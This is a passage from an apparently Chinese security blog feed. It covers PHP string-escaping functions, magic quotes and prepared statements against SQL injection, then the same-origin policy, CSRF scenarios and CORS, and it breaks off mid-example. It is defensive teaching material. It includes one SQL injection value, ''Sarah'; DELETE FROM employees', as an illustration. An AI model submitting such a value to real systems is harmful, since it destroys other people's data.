–&gt;(PHP 4, PHP 5, PHP 7)"></a><strong>0X02 stripslashes() –&gt;(PHP 4, PHP 5, PHP 7)</strong></h2><p><strong>用法:</strong></p><pre><code class="hljs">string stripslashes ( string $str )</code></pre><p>反引用一个引用字符串,如果 magic_quotes_sybase 项开启，反斜线将被去除，但是两个反斜线将会被替换成一个。 </p><p><strong>返回值：</strong></p><p>返回一个去除转义反斜线后的字符串（&#39; 转换为 ‘ 等等）。双反斜线（\）被转换为单个反斜线（\）。 </p><p><strong>代码示例：</strong></p><pre><code class="hljs">&lt;?phpfunction stripslashes_deep($value)&#123;    $value = is_array($value) ?                array_map(&#39;stripslashes_deep&#39;, $value) :                stripslashes($value);    return $value;&#125;// 范例$array = array(&quot;f\\&#39;oo&quot;, &quot;b\\&#39;ar&quot;, array(&quot;fo\\&#39;o&quot;, &quot;b\\&#39;ar&quot;));$array = stripslashes_deep($array);// 输出print_r($array);?&gt;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">Array(    [0] =&gt; f&#39;oo    [1] =&gt; b&#39;ar    [2] =&gt; Array        (            [0] =&gt; fo&#39;o            [1] =&gt; b&#39;ar        ))</code></pre><h2 id="0X03-addcslashes-–-PHP-4-PHP-5-PHP-7"><a href="#0X03-addcslashes-–-PHP-4-PHP-5-PHP-7" class="headerlink" title="0X03 addcslashes() –&gt;(PHP 4, PHP 5, PHP 7)"></a><strong>0X03 addcslashes() –&gt;(PHP 4, PHP 5, PHP 7)</strong></h2><p><strong>用法：</strong></p><pre><code class="hljs">string addcslashes ( string $str , string $charlist )</code></pre><p><strong>返回值:</strong></p><p>返回字符串，该字符串在属于参数 charlist 列表中的字符前都加上了反斜线。 </p><p><strong>示例代码：</strong></p><p>这段代码就是告诉我们要注意选取的字符的范围，大写字母和小写字母中间还有一些可见字符，另外起始字符的ascII 码要小于结束符的，否则达不到预期的效果，只能是转义这个几个列出来的</p><pre><code class="hljs">&lt;?phpecho addcslashes(&#39;foo[ ]&#39;, &#39;A..z&#39;);// 输出：\f\o\o\[ \]// 所有大小写字母均被转义// ... 但 [\]^_` 以及分隔符、换行符、回车符等也一并被转义了。?&gt;</code></pre><blockquote><p><strong>注意：</strong> 当选择对字符 0，a，b，f，n，r，t 和 v 进行转义时需要小心，它们将被转换成 \0，\a，\b，\f，\n，\r，\t 和 \v。在 PHP 中，只有 \0（NULL），\r（回车符），\n（换行符）和<br>\t（制表符）是预定义的转义序列， 而在 C 语言中，上述的所有转换后的字符都是预定义的转义序列。</p></blockquote><h2 id="0X04-stripcslashes-–-PHP-4-PHP-5-PHP-7"><a href="#0X04-stripcslashes-–-PHP-4-PHP-5-PHP-7" class="headerlink" title="0X04 stripcslashes() –&gt;(PHP 4, PHP 5, PHP 7)"></a><strong>0X04 stripcslashes() –&gt;(PHP 4, PHP 5, PHP 7)</strong></h2><p><strong>用法：</strong></p><pre><code class="hljs">string stripcslashes ( string $str )</code></pre><p><strong>返回值：</strong></p><p>返回反转义后的字符串。可识别类似 C 语言的 \n，\r，… 八进制以及十六进制的描述。 </p><p><strong>示例代码：</strong></p><pre><code class="hljs">stripcslashes(&#39;He\xallo&#39;) == &#39;He&#39;.&quot;\n&quot;.&#39;llo&#39;stripcslashes(&#39;H\xaello&#39;) == &#39;H&#39;.chr(0xAE).&#39;llo&#39;</code></pre><h2 id="0X05-mysql-escape-string-–-PHP-4-4-0-3-PHP-5"><a href="#0X05-mysql-escape-string-–-PHP-4-4-0-3-PHP-5" class="headerlink" title="0X05 mysql_escape_string() –&gt;(PHP 4 &gt;&#x3D; 4.0.3, PHP 5)"></a><strong>0X05 mysql_escape_string() –&gt;(PHP 4 &gt;&#x3D; 4.0.3, PHP 5)</strong></h2><p><strong>用法：</strong></p><pre><code class="hljs">string mysql_escape_string ( string $unescaped_string )</code></pre><p>mysql_escape_string() 并不转义 % 和 _。 本函数和 mysql_real_escape_string() 完全一样，除了 mysql_real_escape_string() 接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string() 并不接受连接参数，也不管当前字符集设定。 </p><p><strong>示例代码：</strong></p><pre><code class="hljs">&lt;?php    $item = &quot;Zak&#39;s Laptop&quot;;    $escaped_item = mysql_escape_string($item);    printf (&quot;Escaped string: %s\n&quot;, $escaped_item);?&gt;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">Escaped string: Zak\&#39;s Laptop</code></pre><h2 id="0X06-mysql-real-escape-string-–-PHP-4-4-3-0-PHP-5"><a href="#0X06-mysql-real-escape-string-–-PHP-4-4-3-0-PHP-5" class="headerlink" title="0X06 mysql_real_escape_string() –&gt;(PHP 4 &gt;&#x3D; 4.3.0, PHP 5)"></a><strong>0X06 mysql_real_escape_string() –&gt;(PHP 4 &gt;&#x3D; 4.3.0, PHP 5)</strong></h2><p><strong>用法：</strong></p><pre><code class="hljs">string mysql_real_escape_string ( string $unescaped_string [, resource $link_identifier = NULL ] )</code></pre><p>本函数将 unescaped_string 中的特殊字符转义，并计及连接的当前字符集，因此可以安全用于 mysql_query()。</p><pre><code class="hljs">mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \x00\n \r\&#39;&quot;\x1a.</code></pre><p>为了安全起见，在像MySQL传送查询前，必须调用这个函数（除了少数例外情况）。 </p><blockquote><p><strong>注意：</strong> 本扩展自 PHP 5.5.0 起已废弃，并在自 PHP 7.0.0 开始被移除。应使用 MySQLi 或 PDO_MySQL 扩展来替换之。</p></blockquote><h2 id="0X07-PHP-魔术引号-–-PHP-5-4"><a href="#0X07-PHP-魔术引号-–-PHP-5-4" class="headerlink" title="0X07 PHP 魔术引号 –&gt; (&lt; PHP 5.4)"></a><strong>0X07 PHP 魔术引号 –&gt; (&lt; PHP 5.4)</strong></h2><h3 id="1-什么是魔术引号"><a href="#1-什么是魔术引号" class="headerlink" title="1.什么是魔术引号"></a><strong>1.什么是魔术引号</strong></h3><p> 当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。这和 addslashes() 作用完全相同。</p><p>一共有三个魔术引号指令：</p><p><strong>(1)magic_quotes_gpc</strong> 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。</p><p><strong>代码示例：</strong></p><pre><code class="hljs">&lt;?php// 如果启用了魔术引号echo $_POST[&#39;lastname&#39;];             // O\&#39;reillyecho addslashes($_POST[&#39;lastname&#39;]); // O\\\&#39;reilly// 适用各个 PHP 版本的用法if (get_magic_quotes_gpc()) &#123;    $lastname = stripslashes($_POST[&#39;lastname&#39;]);&#125;else &#123;    $lastname = $_POST[&#39;lastname&#39;];&#125;// 如果使用 MySQL$lastname = mysql_real_escape_string($lastname);echo $lastname; // O\&#39;reilly$sql = &quot;INSERT INTO lastnames (lastname) VALUES (&#39;$lastname&#39;)&quot;;?&gt;</code></pre><p><strong>(2)magic_quotes_runtime</strong> 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。</p><p><strong>代码示例：</strong></p><pre><code class="hljs">&lt;?php// 创建临时文件指针$fp = tmpfile();// 写入一些数据fwrite($fp, &#39;\&#39;PHP\&#39; is a Recursive acronym&#39;);// 没有 magic_quotes_runtimerewind($fp);set_magic_quotes_runtime(false);echo &#39;Without magic_quotes_runtime: &#39; . fread($fp, 64), PHP_EOL;// 有 magic_quotes_runtimerewind($fp);set_magic_quotes_runtime(true);echo &#39;With magic_quotes_runtime: &#39; . fread($fp, 64), PHP_EOL;// 清理fclose($fp);?&gt;</code></pre><blockquote><p><strong>magic_quotes_gpc与magic_quotes_runtime的区别</strong></p><p>1.magic_quotes_runtime是对外部引入的数据库资料或者文件中的特殊字符进行转义，而magic_quotes_gpc是对post、get、cookie等数组传递过来的数据进行特殊字符转义。</p><p>2.他们都有相应的get函数，可以对php环境中是否设置了他们相应功能特性进行探测，如：get_magic_quotes_gpc，是对magic_quotes_gpc是否设置的探测，get_magic_quotes_runtime，是对magic_quotes_runtime是否设置的探测，而且都是如果设置了，get函数返回1，如果没有设置，get函数返回0。</p><p>3.不能在程序里面设置magic_quotes_gpc的值，原因是php中并没有set_magic_quotes_gpc这个函数，而magic_quotes_runtime有对应的能在代码中直接设置magic_quotes_runtime值的函数：set_magic_quotes_runtime，所以，magic_quotes_gpc的值，只能自己手动在php.ini文件里面设置了。</p></blockquote><p><strong>(3)magic_quotes_sybase</strong><br>如果该选项在php.ini文件中是唯一开启的话，将只会转义%00为\0（即null字符）。此选项会完全覆盖magic_quotes_gpc。如果同时开启这两个选项的话，单引号将会被转义成两个单引号，%00会被转义为\0。而双引号、反斜线将不会进行转义</p><p><strong>1.设置：magic_quotes_sybase &#x3D; On &amp; magic_quotes_gpc &#x3D; Off</strong></p><p><strong>输入：</strong></p><pre><code class="hljs">1&#39;2&quot;3\4%005</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1&#39;2&quot;3\45</code></pre><p><strong>结论：</strong></p><p>只将%00（即null字符）过滤了</p><p><strong>2.设置：magic_quotes_sybase &#x3D; On &amp; magic_quotes_gpc &#x3D; On</strong></p><p><strong>输入：</strong></p><pre><code class="hljs">1&#39;2”3\4%005</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">1&#39;&#39;2&quot;3\4\05</code></pre><p><strong>结论：</strong></p><p>magic_quotes_sybase &#x3D; On &amp; magic_quotes_gpc &#x3D; On时，magic_quotes_sybase将会使用单引号对单引号进行转义，%00（即null字符）也会被转义。</p><h3 id="2-为什么存在魔术引号"><a href="#2-为什么存在魔术引号" class="headerlink" title="2.为什么存在魔术引号"></a><strong>2.为什么存在魔术引号</strong></h3><p>没有理由再使用魔术引号，因为它不再是 PHP 支持的一部分。不过它帮助了新手在不知不觉中写出了更好（更安全）的代码。但是在处理代码的时候，最好是更改你的代码而不是依赖于魔术引号的开启。 为什么这个功能存在？是为了阻止SQL 注入。在今天，开发者能够更好得意识到了安全问题，并最终使用数据库转移机制或者 prepared语句来取代魔术引号功能。 </p><h3 id="3-为什么不用魔术引号"><a href="#3-为什么不用魔术引号" class="headerlink" title="3.为什么不用魔术引号"></a><strong>3.为什么不用魔术引号</strong></h3><p><strong>(1)可移植性</strong></p><p>编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。</p><p><strong>(2)性能</strong></p><p>由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</p><p><strong>(3)不便</strong></p><p>由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 &#39;。针对这个问题，可以使用 stripslashes() 函数处理。</p><h2 id="0X08-mysqli-real-escape-string-mysqli-escape-string-–-PHP-5-PHP-7"><a href="#0X08-mysqli-real-escape-string-mysqli-escape-string-–-PHP-5-PHP-7" class="headerlink" title="0X08 mysqli_real_escape_string&#x2F;mysqli_escape_string  –&gt; (PHP &gt;&#x3D; 5 ,PHP 7)"></a><strong>0X08 mysqli_real_escape_string&#x2F;mysqli_escape_string  –&gt; (PHP &gt;&#x3D; 5 ,PHP 7)</strong></h2><p>此函数用来对字符串中的特殊字符进行转义， 以使得这个字符串是一个合法的 SQL 语句。传入的字符串会根据当前连接的字符集进行转义，得到一个编码后的合法的 SQL 语句。<strong>mysqli_escape_string 是 mysqli_real_escape_string 的别名。</strong></p><p><strong>用法：</strong></p><pre><code class="hljs">mysqli_real_escape_string(connection,escapestring);</code></pre><p><strong>参数解释：</strong></p><p>connection必需。规定要使用的 MySQL 连接。<br>escapestring必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。</p><p><strong>返回值：</strong></p><p>返回已转义的字符串。</p><blockquote><p><strong>注意：</strong></p><p>1.调用 mysqli_real_escape_string() 函数之前， 必须先通过调用 mysqli_set_charset() 函数或者在 MySQL 服务器端设置字符集<br>2.mysqli_character_set_name() 返回当前数据库连接的默认字符编码</p></blockquote><h2 id="0X09-prepare-预编译"><a href="#0X09-prepare-预编译" class="headerlink" title="0X09  prepare 预编译"></a><strong>0X09  prepare 预编译</strong></h2><p>通过使用<strong>预编译语句</strong>（prepared statements）和<strong>参数化查询</strong>（parameterized queries）。这些sql语句从参数，分开的发送到数据库服务端，进行解析。这样黑客不可能插入恶意sql代码。</p><p>对应的就是下面这两种方法：</p><p><strong>1.使用PDO对象（对于任何数据库驱动都好用）</strong></p><pre><code class="hljs">$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM employees WHERE name = :name&#39;); $stmt-&gt;execute(array(&#39;name&#39; =&gt; $name)); foreach ($stmt as $row) &#123;// do something with $row &#125;</code></pre><p><strong>2. 使用MySqli</strong></p><pre><code class="hljs">$stmt = $dbConnection-&gt;prepare(&#39;SELECT * FROM employees WHERE name = ?&#39;); $stmt-&gt;bind_param(&#39;s&#39;, $name); $stmt-&gt;execute(); $result = $stmt-&gt;get_result(); while ($row = $result-&gt;fetch_assoc()) &#123;// do something with $row &#125;</code></pre><p><strong>正确地建立连接：</strong></p><p>**注意：**当使用PDO去连接Mysql数据库时，真正的预处理默认并没有开启。为了开启他，你应该关闭模拟的预处理语句，以下是一个例子：</p><pre><code class="hljs">$dbConnection = new PDO(&#39;mysql:dbname=dbtest;host=127.0.0.1;charset=utf8&#39;, &#39;user&#39;, &#39;pass&#39;);$dbConnection-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); $dbConnection-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</code></pre><p>在上面的例子里，错误模式严格意义上来说没有必要，但推荐你加上去。这样，脚本在遇到致命错误（Fatal Error）的时候并不会停止运行。并且给开发者去捕获（catch ）那些PDOException异常。</p><p>第一个setAttribute()是必须的。这告诉PDO去关闭模拟预处理，然后使用真正的预处理语句。这将保证语句和值在被交到Mysql服务器上没有被解析（让攻击者没有机会去进行sql注入。）</p><p>尽管你可以在构造函数里设置字符集（charset ），但你也要注意旧版本的PHP（&lt;5.3.6）会忽略在DSN中设置的字符集参数。</p><p><strong>解释</strong></p><p>到底发生了什么呢？<strong>你的SQL语句交给prepare 之后被数据库服务器解析和编译了</strong>。通过制定参数（不管是“?”还是命名占位符：name），你都可以告诉数据库引擎哪里你想过滤掉。<strong>然后当你执行execute方法时，预处理语句会把你所指定的参数值结合起来。</strong></p><p>这里很重要的就是参数值和编译过的语句绑定在了一起，而不是简简单单的SQL字符串、SQL注入通过骗起脚本加入一些恶意的字符串，在建立sql发送到数据库的时候产生后果。<strong>所以，通过分离的从参数中发送真正的sql语句，你控制了风险</strong>：在结尾的时候你不打算干的一些事。（译者注：请看开篇的例子）。当你使用预编译的时候，任何参数都会被当作字符串。在这个例子里，如果$name变量包含了’Sarah’; DELETE FROM employees 这个结果只会简单的搜索字符串“‘Sarah’; DELETE FROM employees”，所以你不会得到一张空表。</p><p><strong>另外一个使用预编译的好处就是</strong>，如果你在同一个会话中执行一个statement多次，只会被解析和编译一次，对速度更友好。</p><p>哦，既然你问了增加语句的时候怎么使用，下面给你个例子：</p><pre><code class="hljs">$preparedStatement = $db-&gt;prepare(&#39;INSERT INTO table (column) VALUES (:column)&#39;);   $preparedStatement-&gt;execute(array(&#39;column&#39; =&gt; $unsafeValue));</code></pre><p><strong>PDO如何解决sql注入</strong></p><p><strong>完整代码：</strong></p><pre><code class="hljs">&lt;?php$pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;charset=utf8&quot;,&quot;root&quot;);$st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;);$id = 21;$name = &#39;zhangsan&#39;;$st-&gt;bindParam(1,$id);$st-&gt;bindParam(2,$name);$st-&gt;execute();$st-&gt;fetchAll();?&gt;</code></pre><p>在php5.3.6之后，pdo不会在本地对sql进行拼接然后将拼接后的sql传递给mysql server处理（也就是不会在本地做转义处理）。**pdo的处理方法是在prepare函数调用时，将预处理好的sql模板（包含占位符）通过mysql协议传递给mysql server，告诉mysql server模板的结构以及语义。**当调用execute时，将两个参数传递给mysql server。由mysql server完成变量的转移处理。将sql模板和变量分两次传递，即解决了sql注入问题。</p><h2 id="0X10-补充：使用了PDO就一定安全了吗？？？"><a href="#0X10-补充：使用了PDO就一定安全了吗？？？" class="headerlink" title="0X10 补充：使用了PDO就一定安全了吗？？？"></a><strong>0X10 补充：使用了PDO就一定安全了吗？？？</strong></h2><p>建议去看一下PDO 的官方文档，文章中有这样一句话：</p><blockquote><p>the developer can be sure that no SQL injection will occur  <strong>(however,<br>if other portions of the query are being built up with unescaped<br>input, SQL injection is still possible).</strong></p></blockquote><p><strong>翻译过来就是</strong></p><p>开发人员可以确保不会发生SQL注入(然而，如果查询的其他部分是用未转义输入构建的，那么SQL注入就仍然可能)。</p><p>因为有些查询语句并不适合使用PDO 进行处理，可能使用PDO处理比较困困难，于是就有一些没有做处理，还有就是有些挂羊头卖狗肉（估计开发的也不懂PDO），真正用的时候还是老方法，再有就是开发人员对PDO本地预处理的错误开放，以及一些编码问题的处理上可能还是存在问题。</p><p>当然这是面试经常问的问题，请看这三篇文章，虽然有点老，但是我认为对原理的理解还是很有帮助的。</p><p><a href="http://zhangxugg-163-com.iteye.com/blog/1835721">http://zhangxugg-163-com.iteye.com/blog/1835721</a><br><a href="http://zhangxugg-163-com.iteye.com/blog/1855088">http://zhangxugg-163-com.iteye.com/blog/1855088</a><br><a href="http://zhangxugg-163-com.iteye.com/blog/1850461">http://zhangxugg-163-com.iteye.com/blog/1850461</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈前端“源”相关</title>
    <link href="/2019/02/09/%E6%B5%85%E8%B0%88%E5%89%8D%E7%AB%AF%E2%80%9C%E6%BA%90%E2%80%9D%E7%9B%B8%E5%85%B3/"/>
    <url>/2019/02/09/%E6%B5%85%E8%B0%88%E5%89%8D%E7%AB%AF%E2%80%9C%E6%BA%90%E2%80%9D%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>同源策略是前端安全的基石，想学好前端安全的第一步也是最重要的一步就是深入理解同源策略以及和同源策略相关的比如 cors csp jsonp 还有 xss 经常会涉及的 cookie 作用域，以及脚本源的归属问题，原先只是简单的了解，于是打算抽出一点时间再次强化一下对其的理解，以便后期能对前端的安全作出更加深入的分析和探究。</p><h2 id="0X01-同源策略"><a href="#0X01-同源策略" class="headerlink" title="0X01 同源策略"></a><strong>0X01 同源策略</strong></h2><p>为了下面的解释让人更好理解，我想要先解释一下同源策略</p><h3 id="1-什么叫同源"><a href="#1-什么叫同源" class="headerlink" title="1.什么叫同源"></a><strong>1.什么叫同源</strong></h3><p>同源，就是协议、域名、端口号相同的URL，但凡这里面有一个不一样，我们就认为是不同源</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A51.png" alt="此处输入图片的描述"></p><p>下面我们来举一个实际的例子帮助我们理解一下</p><span id="more"></span><p>以<a href="http://abc.com/%E4%B8%BA%E4%BE%8B">http://abc.com/为例</a></p><table><thead><tr><th>url</th><th align="center">是否同源</th><th align="center">原因</th></tr></thead><tbody><tr><td><a href="http://abc.com/other">http://abc.com/other</a></td><td align="center">是</td><td align="center">协议、端口、域名相同</td></tr><tr><td><a href="https://abc.com/">https://abc.com</a></td><td align="center">否</td><td align="center">协议不同(https)</td></tr><tr><td><a href="http://abc.com:81/">http://abc.com:81</a></td><td align="center">否</td><td align="center">端口不同（81）</td></tr><tr><td><a href="http://www.abc.com/">http://www.abc.com/</a></td><td align="center">否</td><td align="center">域名不同，顶级域名与www子域名不是一个概念</td></tr><tr><td><a href="http://news.abc.com/">http://news.abc.com/</a></td><td align="center">否</td><td align="center">域名不同（news)</td></tr></tbody></table><blockquote><p><strong>注意：</strong></p><p>这里比较容易混淆的就是 abc.com  和 <a href="http://www.abc.com/">www.abc.com</a> ，我们常常把 www作为主域名，但是实际上是不规范的，www其实也只是 abc.com 的一个子域名而已。</p></blockquote><h3 id="2-同源策略-Same-Origin-Policy-SOP"><a href="#2-同源策略-Same-Origin-Policy-SOP" class="headerlink" title="2.同源策略  Same-Origin-Policy(SOP)"></a><strong>2.同源策略  Same-Origin-Policy(SOP)</strong></h3><p>浏览器采用同源策略，<strong>在没有明确授权的情况下</strong>，禁止页面加载或执行与自身不同源的任何脚本。</p><blockquote><p>**注意：**这里说的明确授权指的是下面会讲到的 cors jsonp 等合理跨域方式</p></blockquote><h4 id="1-同源策略又分为以下两种："><a href="#1-同源策略又分为以下两种：" class="headerlink" title="(1)同源策略又分为以下两种："></a><strong>(1)同源策略又分为以下两种：</strong></h4><p>**1.DOM 同源策略：**禁止对不同源页面 DOM 进行操作。这里主要场景是 iframe 跨域的情况，不同域名的 iframe 是限制互相访问的(比如一个恶意网站的页面通过iframe嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码)<br>**2.XMLHttpRequest 同源策略：**禁止使用 XHR 对象向不同源的服务器地址发起 HTTP 请求(这一点里面其实包括了 ajax)。</p><h4 id="2-但是同源策略留了一些“后门”"><a href="#2-但是同源策略留了一些“后门”" class="headerlink" title="(2)但是同源策略留了一些“后门”"></a><strong>(2)但是同源策略留了一些“后门”</strong></h4><p>1.页面中的链接，重定向以及表单提交是不会受到同源策略限制的(<strong>未授权情况下，ajax 的表单提交是不被允许的,但是普通的表单是可以直接跨域的</strong>)。<br>2.<code>&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;</code>这些包含 src 属性的标签可以加载跨域资源。但浏览器限制了JavaScript的权限使其不能读、写加载的内容。</p><h3 id="3-为什么要有同源策略"><a href="#3-为什么要有同源策略" class="headerlink" title="3.为什么要有同源策略"></a><strong>3.为什么要有同源策略</strong></h3><p>很明显，我们是为了解决浏览器浏览中的一些安全问题才出现的同源策略，举一下两个例子</p><p><strong>(1)如果没有 DOM 同源策略，也就是说不同域的 iframe 之间可以相互访问，那么黑客可以这样进行攻击：</strong></p><p>1.做一个假网站，里面用 iframe 嵌套一个银行网站 <a href="http://mybank.com./">http://mybank.com。</a><br>2.把 iframe 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。<br>3.这时如果用户输入账号密码，我们的主网站可以跨域访问到 <a href="http://mybank.com/">http://mybank.com</a> 的 dom 节点，就可以拿到用户的账户密码了。</p><p><strong>(2)如果 XMLHttpRequest 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击：</strong></p><p>1.用户登录了自己的银行页面 <a href="http://mybank.com,http//mybank.com">http://mybank.com，http://mybank.com</a> 向用户的 cookie 中添加用户标识。<br>2.用户浏览了恶意页面 <a href="http://evil.com,执行了页面中的恶意/">http://evil.com，执行了页面中的恶意</a> AJAX 请求代码。<br>3.<a href="http://evil.com/">http://evil.com</a> 向 <a href="http://mybank.com/">http://mybank.com</a> 发起 AJAX HTTP 请求，<strong>浏览器会默认把 <a href="http://mybank.com/">http://mybank.com</a> 对应 cookie 也同时发送过去</strong>。<br>4.银行页面从发送的 cookie 中提取用户标识，验证用户无误，response中返回请求数据。此时数据就泄露了，而且由于 Ajax 在后台执行，用户无法感知这一过程。</p><blockquote><p><strong>注意：</strong> </p><p>cookie 是浏览器根据你请求的页面进行发送的，而与从哪个页面发送过去请求无关。比如说，我访问了 a.com 以后获取了 a.com 的cookie ，然后我访问 q.com ，由于 cookie 域的限制，浏览器在请求 q.com 的时候不会携带 a.com 的cookie ，但是当 q.com 有一个向 a.com 发起的请求的时候，浏览器就会自动的在这个请求中带上 a.com 的 cookie。</p></blockquote><h3 id="4-关于同源的一些小结"><a href="#4-关于同源的一些小结" class="headerlink" title="4.关于同源的一些小结"></a><strong>4.关于同源的一些小结</strong></h3><p><strong>(1)跨域读：</strong> 同源策略是不允许这种事情发生的，如果可以你就能使用 js  读取嵌入在 iframe 中的页面的 dom 元素，获取敏感信息了 </p><p>**(2)跨域写：**同源策略不阻止这种操作，比如向不同源的地址发送 POST 请求等，但是这种允许只限制在普通表单（而且是在没有 CSRF token 或者验证 referer 的情况下），对于 ajax 这种方式也是默认不允许的，如果随随便便允许就会出现使用  ajax 来进行 CSRF 请求的情况了</p><p>**(3)跨域嵌入：**这种方式是默认允许的，我们可以在一个源中通过 iframe 嵌入 另一个源的页面，但是如果想限制这种操作的话，我们可以设置 x-frame-options  这个头，这样设置了这个头的页面就允许被嵌入到不同源的页面中了</p><h2 id="0X02-跨域的方法"><a href="#0X02-跨域的方法" class="headerlink" title="0X02 跨域的方法"></a><strong>0X02 跨域的方法</strong></h2><p>我们知道同源策略的出现是为了保证浏览器浏览的安全性，但是在实际的开发中，我们有些时候必须要对不同源的资源进行访问(比如说使用 ajax 进行跨域的表单提交，再比如说前端开发人员需要调用后端开发人员提供的 api 接口获取数据等)，毕竟安全性也不能干扰正常的网站的开发工作，于是在基于同源策略的情况下一些跨域的方式出现了，最主要的方式就是 CORS 和 JSONP </p><h3 id="1-CORS（跨域资源共享）"><a href="#1-CORS（跨域资源共享）" class="headerlink" title="1.CORS（跨域资源共享）"></a><strong>1.CORS（跨域资源共享）</strong></h3><p>跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器  让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A52.png" alt="此处输入图片的描述"></p><p>实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。<br>浏览器将CORS请求分成两类：<strong>简单请求（simple request）<strong>和</strong>非简单请求（not-so-simple request）</strong></p><p>只要同时满足以下两大条件，就属于简单请求。</p><p><strong>1.请求方法是以下三种方法之一：</strong></p><pre><code class="hljs">HEADGETPOST</code></pre><p><strong>2.HTTP的头信息不超出以下几种字段：</strong></p><pre><code class="hljs">AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type：只限于三个值 application/x-www-form-urlencoded、multipart/form-data、text/plain</code></pre><p>凡是不同时满足上面两个条件，就属于非简单请求(最常见的就是 ajax 发送 json 数据)。</p><p><strong>浏览器对这两种请求的处理方式是不一样的</strong></p><h4 id="1-简单请求"><a href="#1-简单请求" class="headerlink" title="(1)简单请求"></a><strong>(1)简单请求</strong></h4><p>1.在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定给予何种响应。例如：Origin: <a href="http://www.k0rz3n.com/">http://www.K0rz3n.com</a></p><p>2.如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：Access-Control-Allow-Origin：<a href="http://www.k0rz3n.com/">http://www.K0rz3n.com</a></p><p>3.没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回这个响应。正常情况下，浏览器会处理该响应。</p><p><strong>例如 localhost:63343 通过Ajax请求<a href="http://192.168.10.61:8080服务器资源时就会出现如下异常：">http://192.168.10.61:8080服务器资源时就会出现如下异常：</a></strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A53.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意:</strong></p><p>请求和响应都不包含 cookie 信息。如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性withCredentials 为 true，服务器需要设置响应头部 Access-Control-Allow-Credentials:true。</p></blockquote><h4 id="2-非简单请求"><a href="#2-非简单请求" class="headerlink" title="(2)非简单请求"></a><strong>(2)非简单请求</strong></h4><p>浏览器在发送真正的请求之前，会先发送一个 Preflight 请求给服务器，这种请求使用 OPTIONS 方法，发送下列头部：</p><pre><code class="hljs">Origin：与简单的请求相同。Access-Control-Request-Method: 请求自身使用的方法。Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。</code></pre><p><strong>例如：</strong></p><pre><code class="hljs">OPTIONS /someData/ HTTP/1.1Host: public-data.com......Origin: http://ambergarden.comAccess-Control-Request-Method: POSTAccess-Control-Request-Headers: X-CUSTOM-HEADER</code></pre><p>发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：</p><pre><code class="hljs">Access-Control-Allow-Origin：与简单的请求相同。Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。Access-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。</code></pre><p><strong>例如：</strong></p><pre><code class="hljs">HTTP/1.1 200 OKAccess-Control-Allow-Origin: http://K0rz3n.comAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: X-CUSTOM_HEADERAccess-Control-Max-Age: 1728000......</code></pre><p>一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS请求，就都跟简单请求一样了。</p><p><strong>请求：</strong></p><pre><code class="hljs">POST /someData/ HTTP/1.1Host: public-data.comX-CUSTOM-HEADER: custom_header_value......[Payload Here]</code></pre><p><strong>响应：</strong></p><pre><code 